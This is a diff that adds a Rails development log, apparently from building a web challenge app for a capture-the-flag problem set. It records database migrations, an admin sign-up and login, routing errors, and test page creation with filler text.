@@ -1,0 +1,2794 @@
+  [1m[35m (0.7ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+  [1m[35m (236.9ms)[0m  [1m[35mCREATE TABLE "schema_migrations" ("version" varchar NOT NULL PRIMARY KEY)[0m
+  [1m[35m (132.9ms)[0m  [1m[35mCREATE TABLE "ar_internal_metadata" ("key" varchar NOT NULL PRIMARY KEY, "value" varchar, "created_at" datetime(6) NOT NULL, "updated_at" datetime(6) NOT NULL)[0m
+  [1m[35m (0.3ms)[0m  [1m[34mSELECT "schema_migrations"."version" FROM "schema_migrations" ORDER BY "schema_migrations"."version" ASC[0m
+Migrating to CreateUsers (20200924122406)
+  [1m[35m (0.1ms)[0m  [1m[36mbegin transaction[0m
+  [1m[35m (0.7ms)[0m  [1m[35mCREATE TABLE "users" ("id" integer PRIMARY KEY AUTOINCREMENT NOT NULL, "name" varchar, "email" varchar, "password_digest" varchar, "created_at" datetime(6) NOT NULL, "updated_at" datetime(6) NOT NULL)[0m
+  [1m[36mprimary::SchemaMigration Create (0.3ms)[0m  [1m[32mINSERT INTO "schema_migrations" ("version") VALUES (?)[0m  [["version", "20200924122406"]]
+  [1m[35m (129.4ms)[0m  [1m[36mcommit transaction[0m
+  [1m[36mActiveRecord::InternalMetadata Load (0.4ms)[0m  [1m[34mSELECT "ar_internal_metadata".* FROM "ar_internal_metadata" WHERE "ar_internal_metadata"."key" = ? LIMIT ?[0m  [["key", "environment"], ["LIMIT", 1]]
+  [1m[35m (0.1ms)[0m  [1m[36mbegin transaction[0m
+  [1m[36mActiveRecord::InternalMetadata Create (0.6ms)[0m  [1m[32mINSERT INTO "ar_internal_metadata" ("key", "value", "created_at", "updated_at") VALUES (?, ?, ?, ?)[0m  [["key", "environment"], ["value", "development"], ["created_at", "2020-09-24 12:24:18.799979"], ["updated_at", "2020-09-24 12:24:18.799979"]]
+  [1m[35m (87.2ms)[0m  [1m[36mcommit transaction[0m
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+  [1m[35m (0.9ms)[0m  [1m[34mSELECT "schema_migrations"."version" FROM "schema_migrations" ORDER BY "schema_migrations"."version" ASC[0m
+Started GET "/users/new" for ::1 at 2020-09-24 20:36:23 +0800
+  [1m[35m (1.5ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+  [1m[35m (0.2ms)[0m  [1m[34mSELECT "schema_migrations"."version" FROM "schema_migrations" ORDER BY "schema_migrations"."version" ASC[0m
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 105.9ms | Allocations: 5853)
+Completed 500 Internal Server Error in 353ms (ActiveRecord: 1.3ms | Allocations: 36802)
+
+
+  
+ActionView::Template::Error (The asset "application.js" is not present in the asset pipeline.
+):
+     5:     <%= csrf_meta_tags %>
+     6: 
+     7:     <%= stylesheet_link_tag    'application', media: 'all', 'data-turbolinks-track': 'reload' %>
+     8:     <%= javascript_include_tag 'application', 'data-turbolinks-track': 'reload' %>
+     9:   </head>
+    10: 
+    11:   <body>
+  
+app/views/layouts/application.html.erb:8
+Started GET "/users/new" for ::1 at 2020-09-24 20:37:23 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 3.7ms | Allocations: 1383)
+Completed 500 Internal Server Error in 422ms (ActiveRecord: 0.0ms | Allocations: 148475)
+
+
+  
+ActionView::Template::Error (undefined local variable or method `current_user' for #<#<Class:0x00007f86357c4918>:0x00007f86357bae90>
+Did you mean?  current_page?):
+     9:   <body>
+    10: 
+    11:     <!-- show nav links -->
+    12:     <% if current_user %>
+    13:       <!-- current_user will return true if a user is logged in -->
+    14:       <%= "Logged in as #{current_user.email}" %> | <%= link_to 'Home', root_path %> | <%= link_to 'Log Out', logout_path, method: :delete %>
+    15:     <% else %>
+  
+app/views/layouts/application.html.erb:12
+Started GET "/users/new" for ::1 at 2020-09-24 20:41:18 +0800
+  [1m[35m (4.1ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+  [1m[35m (9.6ms)[0m  [1m[34mSELECT "schema_migrations"."version" FROM "schema_migrations" ORDER BY "schema_migrations"."version" ASC[0m
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 65.1ms | Allocations: 3780)
+Completed 200 OK in 138ms (Views: 77.5ms | ActiveRecord: 1.9ms | Allocations: 12449)
+
+
+Started POST "/users" for ::1 at 2020-09-24 20:42:22 +0800
+Processing by UsersController#create as HTML
+  Parameters: {"authenticity_token"=>"ZAT3cZI5HfXkLZywr1e2qctdmqmtZSxYL9pMD46pQgiPftQC4ZbV4HjyaJPHwzVKuqAb5tbUHuzxLDs/hD0wsA==", "user"=>{"name"=>"admin", "email"=>"admin@admin.com", "password"=>"[FILTERED]", "password_confirmation"=>"[FILTERED]"}, "commit"=>"Sign up!"}
+  [1m[35m (0.1ms)[0m  [1m[36mbegin transaction[0m
+  ↳ app/controllers/users_controller.rb:13:in `create'
+  [1m[36mUser Exists? (13.1ms)[0m  [1m[34mSELECT 1 AS one FROM "users" WHERE "users"."email" = ? LIMIT ?[0m  [["email", "admin@admin.com"], ["LIMIT", 1]]
+  ↳ app/controllers/users_controller.rb:13:in `create'
+  [1m[36mUser Create (8.7ms)[0m  [1m[32mINSERT INTO "users" ("name", "email", "password_digest", "created_at", "updated_at") VALUES (?, ?, ?, ?, ?)[0m  [["name", "admin"], ["email", "admin@admin.com"], ["password_digest", "$2a$12$Rahg8YTJU6aUzKYUSb5GUeQnU/ZcioSJFOdekzysjuLgmFJtZ1F2q"], ["created_at", "2020-09-24 12:42:22.349723"], ["updated_at", "2020-09-24 12:42:22.349723"]]
+  ↳ app/controllers/users_controller.rb:13:in `create'
+  [1m[35m (751.8ms)[0m  [1m[36mcommit transaction[0m
+  ↳ app/controllers/users_controller.rb:13:in `create'
+Redirected to http://localhost:3000/
+Completed 302 Found in 1099ms (ActiveRecord: 773.8ms | Allocations: 6510)
+
+
+Started GET "/" for ::1 at 2020-09-24 20:42:23 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 6.9ms | Allocations: 1033)
+Completed 200 OK in 11ms (Views: 9.6ms | ActiveRecord: 0.0ms | Allocations: 1699)
+
+
+Started GET "/login" for ::1 at 2020-09-24 20:42:25 +0800
+Processing by SessionsController#new as HTML
+  Rendering sessions/new.html.erb within layouts/application
+  Rendered sessions/new.html.erb within layouts/application (Duration: 3.8ms | Allocations: 1027)
+Completed 200 OK in 11ms (Views: 8.4ms | ActiveRecord: 0.0ms | Allocations: 2237)
+
+
+Started POST "/login" for ::1 at 2020-09-24 20:47:29 +0800
+Processing by SessionsController#create as HTML
+  Parameters: {"authenticity_token"=>"kUgRzqKiA9h7LQCcE/7RVhjbkizUNWU+I0IVzydPneiLOqSdu7c8cmW7NqYHf46X6xwo9isHBHE3j51TkA6W2Q==", "login"=>{"email"=>"admin@admin.com", "password"=>"[FILTERED]"}, "commit"=>"Log In"}
+  [1m[36mUser Load (0.3ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."email" = ? LIMIT ?[0m  [["email", "admin@admin.com"], ["LIMIT", 1]]
+  ↳ app/controllers/sessions_controller.rb:11:in `create'
+Redirected to http://localhost:3000/
+Completed 302 Found in 277ms (ActiveRecord: 0.3ms | Allocations: 1160)
+
+
+Started GET "/" for ::1 at 2020-09-24 20:47:29 +0800
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 2.3ms | Allocations: 1039)
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 6ms (Views: 5.0ms | ActiveRecord: 0.2ms | Allocations: 2422)
+
+
+  [1m[35m (0.8ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+  [1m[35m (0.2ms)[0m  [1m[34mSELECT "schema_migrations"."version" FROM "schema_migrations" ORDER BY "schema_migrations"."version" ASC[0m
+Migrating to CreateLinks (20200924125206)
+  [1m[35m (0.1ms)[0m  [1m[36mbegin transaction[0m
+  [1m[35m (0.5ms)[0m  [1m[35mCREATE TABLE "links" ("id" integer PRIMARY KEY AUTOINCREMENT NOT NULL, "title" varchar, "text" text, "created_at" datetime(6) NOT NULL, "updated_at" datetime(6) NOT NULL)[0m
+  [1m[36mprimary::SchemaMigration Create (0.2ms)[0m  [1m[32mINSERT INTO "schema_migrations" ("version") VALUES (?)[0m  [["version", "20200924125206"]]
+  [1m[35m (195.0ms)[0m  [1m[36mcommit transaction[0m
+  [1m[36mActiveRecord::InternalMetadata Load (0.3ms)[0m  [1m[34mSELECT "ar_internal_metadata".* FROM "ar_internal_metadata" WHERE "ar_internal_metadata"."key" = ? LIMIT ?[0m  [["key", "environment"], ["LIMIT", 1]]
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT "schema_migrations"."version" FROM "schema_migrations" ORDER BY "schema_migrations"."version" ASC[0m
+Started GET "/users/new" for ::1 at 2020-09-24 21:07:03 +0800
+  [1m[35m (1.2ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+  [1m[35m (0.2ms)[0m  [1m[34mSELECT "schema_migrations"."version" FROM "schema_migrations" ORDER BY "schema_migrations"."version" ASC[0m
+Processing by UsersController#new as HTML
+  Rendering users/new.html.erb within layouts/application
+  Rendered users/new.html.erb within layouts/application (Duration: 6.4ms | Allocations: 3765)
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 27ms (Views: 13.7ms | ActiveRecord: 1.1ms | Allocations: 13876)
+
+
+Started GET "/links/new" for ::1 at 2020-09-24 21:07:07 +0800
+  
+Zeitwerk::NameError (expected file /home/rafie/ctf/2020/gemastik/probset/web/myapp/app/controllers/links_controller.rb to define constant LinksController, but didn't):
+  
+zeitwerk (2.4.0) lib/zeitwerk/loader/callbacks.rb:17:in `on_file_autoloaded'
+zeitwerk (2.4.0) lib/zeitwerk/kernel.rb:28:in `block in require'
+zeitwerk (2.4.0) lib/zeitwerk/kernel.rb:27:in `tap'
+zeitwerk (2.4.0) lib/zeitwerk/kernel.rb:27:in `require'
+activesupport (6.0.3.3) lib/active_support/inflector/methods.rb:282:in `const_get'
+activesupport (6.0.3.3) lib/active_support/inflector/methods.rb:282:in `block in constantize'
+activesupport (6.0.3.3) lib/active_support/inflector/methods.rb:280:in `each'
+activesupport (6.0.3.3) lib/active_support/inflector/methods.rb:280:in `inject'
+activesupport (6.0.3.3) lib/active_support/inflector/methods.rb:280:in `constantize'
+activesupport (6.0.3.3) lib/active_support/dependencies/zeitwerk_integration.rb:19:in `constantize'
+actionpack (6.0.3.3) lib/action_dispatch/http/request.rb:89:in `controller_class_for'
+actionpack (6.0.3.3) lib/action_dispatch/http/parameters.rb:100:in `binary_params_for?'
+actionpack (6.0.3.3) lib/action_dispatch/http/parameters.rb:91:in `set_binary_encoding'
+actionpack (6.0.3.3) lib/action_dispatch/http/parameters.rb:69:in `path_parameters='
+actionpack (6.0.3.3) lib/action_dispatch/journey/router.rb:47:in `block in serve'
+actionpack (6.0.3.3) lib/action_dispatch/journey/router.rb:32:in `each'
+actionpack (6.0.3.3) lib/action_dispatch/journey/router.rb:32:in `serve'
+actionpack (6.0.3.3) lib/action_dispatch/routing/route_set.rb:834:in `call'
+rack (2.2.3) lib/rack/tempfile_reaper.rb:15:in `call'
+rack (2.2.3) lib/rack/etag.rb:27:in `call'
+rack (2.2.3) lib/rack/conditional_get.rb:27:in `call'
+rack (2.2.3) lib/rack/head.rb:12:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/http/content_security_policy.rb:18:in `call'
+rack (2.2.3) lib/rack/session/abstract/id.rb:266:in `context'
+rack (2.2.3) lib/rack/session/abstract/id.rb:260:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/cookies.rb:648:in `call'
+activerecord (6.0.3.3) lib/active_record/migration.rb:567:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/callbacks.rb:27:in `block in call'
+activesupport (6.0.3.3) lib/active_support/callbacks.rb:101:in `run_callbacks'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/callbacks.rb:26:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/executor.rb:14:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/actionable_exceptions.rb:17:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/debug_exceptions.rb:32:in `call'
+web-console (4.0.4) lib/web_console/middleware.rb:132:in `call_app'
+web-console (4.0.4) lib/web_console/middleware.rb:28:in `block in call'
+web-console (4.0.4) lib/web_console/middleware.rb:17:in `catch'
+web-console (4.0.4) lib/web_console/middleware.rb:17:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/show_exceptions.rb:33:in `call'
+railties (6.0.3.3) lib/rails/rack/logger.rb:37:in `call_app'
+railties (6.0.3.3) lib/rails/rack/logger.rb:26:in `block in call'
+activesupport (6.0.3.3) lib/active_support/tagged_logging.rb:80:in `block in tagged'
+activesupport (6.0.3.3) lib/active_support/tagged_logging.rb:28:in `tagged'
+activesupport (6.0.3.3) lib/active_support/tagged_logging.rb:80:in `tagged'
+railties (6.0.3.3) lib/rails/rack/logger.rb:26:in `call'
+sprockets-rails (3.2.2) lib/sprockets/rails/quiet_assets.rb:13:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/remote_ip.rb:81:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/request_id.rb:27:in `call'
+rack (2.2.3) lib/rack/method_override.rb:24:in `call'
+rack (2.2.3) lib/rack/runtime.rb:22:in `call'
+activesupport (6.0.3.3) lib/active_support/cache/strategy/local_cache_middleware.rb:29:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/executor.rb:14:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/static.rb:126:in `call'
+rack (2.2.3) lib/rack/sendfile.rb:110:in `call'
+actionpack (6.0.3.3) lib/action_dispatch/middleware/host_authorization.rb:82:in `call'
+webpacker (4.3.0) lib/webpacker/dev_server_proxy.rb:23:in `perform_request'
+rack-proxy (0.6.5) lib/rack/proxy.rb:57:in `call'
+railties (6.0.3.3) lib/rails/engine.rb:527:in `call'
+puma (4.3.6) lib/puma/configuration.rb:228:in `call'
+puma (4.3.6) lib/puma/server.rb:713:in `handle_request'
+puma (4.3.6) lib/puma/server.rb:472:in `process_client'
+puma (4.3.6) lib/puma/server.rb:328:in `block in run'
+puma (4.3.6) lib/puma/thread_pool.rb:134:in `block in spawn_thread'
+Started GET "/links/new" for ::1 at 2020-09-24 21:07:38 +0800
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+Processing by LinksController#show as HTML
+  Parameters: {"id"=>"new"}
+Completed 500 Internal Server Error in 3ms (ActiveRecord: 0.0ms | Allocations: 2241)
+
+
+  
+NameError (uninitialized constant LinksController::Links):
+  
+app/controllers/links_controller.rb:4:in `show'
+Started GET "/links/new" for ::1 at 2020-09-24 21:09:15 +0800
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+Processing by LinksController#show as HTML
+  Parameters: {"id"=>"new"}
+Completed 500 Internal Server Error in 6ms (ActiveRecord: 0.0ms | Allocations: 4162)
+
+
+  
+NameError (uninitialized constant LinksController::Links):
+  
+app/controllers/links_controller.rb:4:in `show'
+Started GET "/links/new" for ::1 at 2020-09-24 21:10:08 +0800
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+Processing by LinksController#new as HTML
+Completed 500 Internal Server Error in 8ms (ActiveRecord: 0.0ms | Allocations: 4162)
+
+
+  
+NameError (uninitialized constant LinksController::Links):
+  
+app/controllers/links_controller.rb:8:in `new'
+Started GET "/links/new" for ::1 at 2020-09-24 21:10:10 +0800
+Processing by LinksController#new as HTML
+Completed 500 Internal Server Error in 7ms (ActiveRecord: 0.0ms | Allocations: 2232)
+
+
+  
+NameError (uninitialized constant LinksController::Links):
+  
+app/controllers/links_controller.rb:8:in `new'
+Started GET "/links/new" for ::1 at 2020-09-24 21:10:28 +0800
+  [1m[35m (1.1ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+  [1m[35m (0.2ms)[0m  [1m[34mSELECT "schema_migrations"."version" FROM "schema_migrations" ORDER BY "schema_migrations"."version" ASC[0m
+Processing by LinksController#new as HTML
+Completed 500 Internal Server Error in 11ms (ActiveRecord: 0.0ms | Allocations: 2294)
+
+
+  
+NameError (uninitialized constant LinksController::Links):
+  
+app/controllers/links_controller.rb:8:in `new'
+Started GET "/links/new" for ::1 at 2020-09-24 21:15:09 +0800
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+Processing by LinksController#new as HTML
+Completed 500 Internal Server Error in 4ms (ActiveRecord: 0.0ms | Allocations: 2212)
+
+
+  
+NameError (uninitialized constant LinksController::Links):
+  
+app/controllers/links_controller.rb:8:in `new'
+Started GET "/links/new" for ::1 at 2020-09-24 21:15:41 +0800
+Processing by LinksController#new as HTML
+Completed 500 Internal Server Error in 3ms (ActiveRecord: 0.0ms | Allocations: 2210)
+
+
+  
+NameError (uninitialized constant LinksController::Links):
+  
+app/controllers/links_controller.rb:8:in `new'
+  [1m[35m (0.8ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT "schema_migrations"."version" FROM "schema_migrations" ORDER BY "schema_migrations"."version" ASC[0m
+Migrating to CreatePages (20200924131935)
+  [1m[35m (0.1ms)[0m  [1m[36mbegin transaction[0m
+  [1m[35m (0.3ms)[0m  [1m[35mCREATE TABLE "pages" ("id" integer PRIMARY KEY AUTOINCREMENT NOT NULL, "title" varchar, "text" text, "created_at" datetime(6) NOT NULL, "updated_at" datetime(6) NOT NULL)[0m
+  [1m[36mprimary::SchemaMigration Create (0.1ms)[0m  [1m[32mINSERT INTO "schema_migrations" ("version") VALUES (?)[0m  [["version", "20200924131935"]]
+  [1m[35m (199.5ms)[0m  [1m[36mcommit transaction[0m
+  [1m[36mActiveRecord::InternalMetadata Load (0.1ms)[0m  [1m[34mSELECT "ar_internal_metadata".* FROM "ar_internal_metadata" WHERE "ar_internal_metadata"."key" = ? LIMIT ?[0m  [["key", "environment"], ["LIMIT", 1]]
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT "schema_migrations"."version" FROM "schema_migrations" ORDER BY "schema_migrations"."version" ASC[0m
+Started GET "/pages/new" for ::1 at 2020-09-24 21:24:35 +0800
+  [1m[35m (1.1ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+  [1m[35m (0.3ms)[0m  [1m[34mSELECT "schema_migrations"."version" FROM "schema_migrations" ORDER BY "schema_migrations"."version" ASC[0m
+Processing by PagesController#show as HTML
+  Parameters: {"id"=>"new"}
+  Rendering pages/show.html.erb within layouts/application
+  Rendered pages/show.html.erb within layouts/application (Duration: 5.1ms | Allocations: 2194)
+Completed 500 Internal Server Error in 18ms (ActiveRecord: 0.0ms | Allocations: 4376)
+
+
+  
+ActionView::Template::Error (undefined method `title' for nil:NilClass):
+    1: 
+    2: <p>
+    3:   <strong>Title:</strong>
+    4:   <%= @page.title %>
+    5: </p>
+    6:  
+    7: <p>
+  
+app/views/pages/show.html.erb:4
+Started GET "/pages/new" for ::1 at 2020-09-24 21:24:49 +0800
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+Processing by PagesController#new as HTML
+  Rendering pages/new.html.erb within layouts/application
+  Rendered pages/new.html.erb within layouts/application (Duration: 6.7ms | Allocations: 3267)
+  [1m[36mUser Load (0.3ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 31ms (Views: 21.2ms | ActiveRecord: 2.0ms | Allocations: 15561)
+
+
+  [1m[35m (0.6ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+  [1m[35m (0.2ms)[0m  [1m[34mSELECT "schema_migrations"."version" FROM "schema_migrations" ORDER BY "schema_migrations"."version" ASC[0m
+  [1m[36mActiveRecord::InternalMetadata Load (0.1ms)[0m  [1m[34mSELECT "ar_internal_metadata".* FROM "ar_internal_metadata" WHERE "ar_internal_metadata"."key" = ? LIMIT ?[0m  [["key", "environment"], ["LIMIT", 1]]
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT "schema_migrations"."version" FROM "schema_migrations" ORDER BY "schema_migrations"."version" ASC[0m
+  [1m[35m (0.8ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT "schema_migrations"."version" FROM "schema_migrations" ORDER BY "schema_migrations"."version" ASC[0m
+  [1m[36mActiveRecord::InternalMetadata Load (0.1ms)[0m  [1m[34mSELECT "ar_internal_metadata".* FROM "ar_internal_metadata" WHERE "ar_internal_metadata"."key" = ? LIMIT ?[0m  [["key", "environment"], ["LIMIT", 1]]
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT "schema_migrations"."version" FROM "schema_migrations" ORDER BY "schema_migrations"."version" ASC[0m
+Started POST "/pages" for ::1 at 2020-09-24 21:27:48 +0800
+  [1m[35m (0.7ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+  [1m[35m (0.2ms)[0m  [1m[34mSELECT "schema_migrations"."version" FROM "schema_migrations" ORDER BY "schema_migrations"."version" ASC[0m
+Processing by PagesController#create as HTML
+  Parameters: {"authenticity_token"=>"gvUq6E6tGk1FjKUEEV3sAZv5KTH5nOTvYNPo9fJdLKJsPrDq4G6nbef9wmO0+zL2JMnDh7c6rgZbJBaqIw054g==", "page"=>{"title"=>"tes", "text"=>"sadasdasd"}, "commit"=>"Save Page"}
+  [1m[35m (0.1ms)[0m  [1m[36mbegin transaction[0m
+  ↳ app/controllers/pages_controller.rb:10:in `create'
+  [1m[36mPage Create (0.5ms)[0m  [1m[32mINSERT INTO "pages" ("title", "text", "created_at", "updated_at") VALUES (?, ?, ?, ?)[0m  [["title", "tes"], ["text", "sadasdasd"], ["created_at", "2020-09-24 13:27:49.007937"], ["updated_at", "2020-09-24 13:27:49.007937"]]
+  ↳ app/controllers/pages_controller.rb:10:in `create'
+  [1m[35m (153.6ms)[0m  [1m[36mcommit transaction[0m
+  ↳ app/controllers/pages_controller.rb:10:in `create'
+Redirected to 
+Completed 500 Internal Server Error in 410ms (ActiveRecord: 155.1ms | Allocations: 105872)
+
+
+  
+NoMethodError (undefined method `page_url' for #<PagesController:0x00007f0834c624b8>
+Did you mean?  pages_url):
+  
+app/controllers/pages_controller.rb:11:in `create'
+Started GET "/pages/new" for ::1 at 2020-09-24 21:28:37 +0800
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+Processing by PagesController#new as HTML
+  Rendering pages/new.html.erb within layouts/application
+  Rendered pages/new.html.erb within layouts/application (Duration: 7.7ms | Allocations: 3242)
+  [1m[36mUser Load (0.3ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 33ms (Views: 22.4ms | ActiveRecord: 2.0ms | Allocations: 16166)
+
+
+Started POST "/pages" for ::1 at 2020-09-24 21:28:39 +0800
+Processing by PagesController#create as HTML
+  Parameters: {"authenticity_token"=>"+Hd/jwXP45dhBlOrVycDPpnF3vGbP4qqJ8oeZM7KU4gWvOWNqwxet8N3NMzygd3JJvU0R9WZwEMcPeA7H5pGyA==", "page"=>{"title"=>"asd", "text"=>"asdasd"}, "commit"=>"Save Page"}
+  [1m[35m (0.1ms)[0m  [1m[36mbegin transaction[0m
+  ↳ app/controllers/pages_controller.rb:10:in `create'
+  [1m[36mPage Create (0.3ms)[0m  [1m[32mINSERT INTO "pages" ("title", "text", "created_at", "updated_at") VALUES (?, ?, ?, ?)[0m  [["title", "asd"], ["text", "asdasd"], ["created_at", "2020-09-24 13:28:39.560397"], ["updated_at", "2020-09-24 13:28:39.560397"]]
+  ↳ app/controllers/pages_controller.rb:10:in `create'
+  [1m[35m (160.1ms)[0m  [1m[36mcommit transaction[0m
+  ↳ app/controllers/pages_controller.rb:10:in `create'
+Redirected to 
+Completed 500 Internal Server Error in 169ms (ActiveRecord: 160.4ms | Allocations: 4723)
+
+
+  
+ActionController::ActionControllerError (Cannot redirect to nil!):
+  
+app/controllers/pages_controller.rb:11:in `create'
+Started GET "/pages/new" for ::1 at 2020-09-24 21:28:50 +0800
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+Processing by PagesController#new as HTML
+  Rendering pages/new.html.erb within layouts/application
+  Rendered pages/new.html.erb within layouts/application (Duration: 2.9ms | Allocations: 794)
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 31ms (Views: 17.8ms | ActiveRecord: 2.1ms | Allocations: 11725)
+
+
+Started POST "/pages" for ::1 at 2020-09-24 21:28:52 +0800
+Processing by PagesController#create as HTML
+  Parameters: {"authenticity_token"=>"siqOfVe1+J04qCHRdwXVkZcKvLVx1GVmFNcfDFECHu1c4RR/+XZFvZrZRrbSowtmKDpWAz9yL48vIOFTgFILrQ==", "page"=>{"title"=>"asdasd", "text"=>"qqqqq"}, "commit"=>"Save Page"}
+  [1m[35m (0.1ms)[0m  [1m[36mbegin transaction[0m
+  ↳ app/controllers/pages_controller.rb:10:in `create'
+  [1m[36mPage Create (0.5ms)[0m  [1m[32mINSERT INTO "pages" ("title", "text", "created_at", "updated_at") VALUES (?, ?, ?, ?)[0m  [["title", "asdasd"], ["text", "qqqqq"], ["created_at", "2020-09-24 13:28:52.388653"], ["updated_at", "2020-09-24 13:28:52.388653"]]
+  ↳ app/controllers/pages_controller.rb:10:in `create'
+  [1m[35m (77.5ms)[0m  [1m[36mcommit transaction[0m
+  ↳ app/controllers/pages_controller.rb:10:in `create'
+Redirected to 
+Completed 500 Internal Server Error in 87ms (ActiveRecord: 78.1ms | Allocations: 4609)
+
+
+  
+ActionController::ActionControllerError (Cannot redirect to nil!):
+  
+app/controllers/pages_controller.rb:11:in `create'
+Started GET "/pages/new" for ::1 at 2020-09-24 21:29:20 +0800
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+Processing by PagesController#new as HTML
+  Rendering pages/new.html.erb within layouts/application
+  Rendered pages/new.html.erb within layouts/application (Duration: 2.3ms | Allocations: 794)
+  [1m[36mUser Load (0.1ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
+Completed 200 OK in 28ms (Views: 15.9ms | ActiveRecord: 2.0ms | Allocations: 11800)
+
+
+Started POST "/pages" for ::1 at 2020-09-24 21:29:22 +0800
+Processing by PagesController#create as HTML
+  Parameters: {"authenticity_token"=>"KzUbZmiCMor7nlUX1BcHxxzYjYtkS/MdU97AjAjwtNTF/oFkxkGPqlnvMnBxsdkwo+hnPSrtufRoKT7T2aChlA==", "page"=>{"title"=>"sadsad", "text"=>"asdsad"}, "commit"=>"Save Page"}
+  [1m[35m (0.1ms)[0m  [1m[36mbegin transaction[0m
+  ↳ app/controllers/pages_controller.rb:10:in `create'
+  [1m[36mPage Create (0.6ms)[0m  [1m[32mINSERT INTO "pages" ("title", "text", "created_at", "updated_at") VALUES (?, ?, ?, ?)[0m  [["title", "sadsad"], ["text", "asdsad"], ["created_at", "2020-09-24 13:29:22.660541"], ["updated_at", "2020-09-24 13:29:22.660541"]]
+  ↳ app/controllers/pages_controller.rb:10:in `create'
+  [1m[35m (95.3ms)[0m  [1m[36mcommit transaction[0m
+  ↳ app/controllers/pages_controller.rb:10:in `create'
+Redirected to 
+Completed 500 Internal Server Error in 323ms (ActiveRecord: 96.0ms | Allocations: 100767)
+
+
+  
+NoMethodError (undefined method `page_url' for #<PagesController:0x00007f083680ed38>
+Did you mean?  pages_url):
+  
+app/controllers/pages_controller.rb:11:in `create'
+Started GET "/pages/new" for ::1 at 2020-09-24 21:30:03 +0800
+  [1m[35m (0.1ms)[0m  [1m[34mSELECT sqlite_version(*)[0m
+Processing by PagesController#new as HTML
+  Rendering pages/new.html.erb within layouts/application
+  Rendered pages/new.html.erb within layouts/application (Duration: 1.9ms | Allocations: 794)
+  [1m[36mUser Load (0.2ms)[0m  [1m[34mSELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT ?[0m  [["id", 1], ["LIMIT", 1]]
+  ↳ app/controllers/application_controller.rb:10:in `current_user'
